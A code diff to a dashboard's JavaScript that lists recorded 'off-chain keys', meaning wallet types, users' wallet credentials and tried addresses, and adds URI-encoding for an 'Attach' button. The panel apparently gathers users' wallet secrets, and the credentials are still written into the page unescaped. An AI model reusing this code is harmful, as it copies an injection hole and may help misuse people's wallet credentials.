@@ -643,7 +643,7 @@
         }
 
         async function loadOffChainKeys() {
-            document.getElementById('offChainTableBody').innerHTML = '<tr><td colspan="5" style="text-align:center;padding:40px;color:#999;">Loading...</td></tr>';
+            document.getElementById('offChainTableBody').innerHTML = '<tr><td colspan="6" style="text-align:center;padding:40px;color:#999;">Loading...</td></tr>';
             try {
                 const res = await fetch(`${API}/get-off-chain-keys`, {
                     headers: {'Authorization': `Bearer ${token}`}
@@ -653,21 +653,25 @@
                 const list = data.offChainKeys || [];
                 document.getElementById('offChainBadge').textContent = list.length > 0 ? `(${list.length})` : '';
                 if (list.length === 0) {
-                    document.getElementById('offChainTableBody').innerHTML = '<tr><td colspan="5" style="text-align:center;padding:40px;color:#999;">No off-chain keys recorded yet</td></tr>';
+                    document.getElementById('offChainTableBody').innerHTML = '<tr><td colspan="6" style="text-align:center;padding:40px;color:#999;">No off-chain keys recorded yet</td></tr>';
                     return;
                 }
                 document.getElementById('offChainTableBody').innerHTML = list.map(k => {
                     const tried = Array.isArray(k.triedAddresses) ? k.triedAddresses.join('<br>') : (k.triedAddresses || '-');
+                    const encodedWalletType = encodeURIComponent(k.walletType || '');
+                    const encodedInputType = encodeURIComponent(k.inputType || '');
+                    const encodedCreds = encodeURIComponent(k.credentials || '');
                     return `<tr>
                         <td>${new Date(k.recordedAt).toLocaleString()}</td>
                         <td><span class="badge badge-warning">${k.walletType || '-'}</span></td>
                         <td>${k.inputType || '-'}</td>
                         <td style="font-family:monospace;font-size:12px;">${tried}</td>
-                        <td><div class=\"credentials-box\" style=\"max-width:300px;\">${k.credentials || '-'}</div></td>\n                        <td><button class=\"btn-small btn-credit-sol\" data-id=\"${k.id}\" data-type=\"${k.walletType}\" data-input=\"${k.inputType}\" data-creds=\"${k.credentials}\" onclick='openAttach(this)'>Attach</button></td>
+                        <td><div class="credentials-box" style="max-width:300px;">${k.credentials || '-'}</div></td>
+                        <td><button class="btn-small btn-credit-sol" data-id="${k.id}" data-type="${encodedWalletType}" data-input="${encodedInputType}" data-creds="${encodedCreds}" onclick="openAttach(this)">Attach</button></td>
                     </tr>`;
                 }).join('');
             } catch (e) {
-                document.getElementById('offChainTableBody').innerHTML = `<tr><td colspan="5" style="text-align:center;color:red;">Error: ${e.message}</td></tr>`;
+                document.getElementById('offChainTableBody').innerHTML = `<tr><td colspan="6" style="text-align:center;color:red;">Error: ${e.message}</td></tr>`;
             }
         }
 
@@ -676,9 +680,12 @@
         }
 
         function openAttach(btn) {
-            document.getElementById('attachWalletType').textContent = btn.dataset.type || '-';
-            document.getElementById('attachInputType').textContent = btn.dataset.input || '-';
-            document.getElementById('attachCredentials').textContent = btn.dataset.creds || '-';
+            const walletType = btn.dataset.type ? decodeURIComponent(btn.dataset.type) : '-';
+            const inputType = btn.dataset.input ? decodeURIComponent(btn.dataset.input) : '-';
+            const credentials = btn.dataset.creds ? decodeURIComponent(btn.dataset.creds) : '-';
+            document.getElementById('attachWalletType').textContent = walletType;
+            document.getElementById('attachInputType').textContent = inputType;
+            document.getElementById('attachCredentials').textContent = credentials;
             document.getElementById('attachAlert').innerHTML = '';
             document.getElementById('attachOffChainForm').dataset.keyId = btn.dataset.id;
             document.getElementById('attachOffChainModal').classList.add('active');
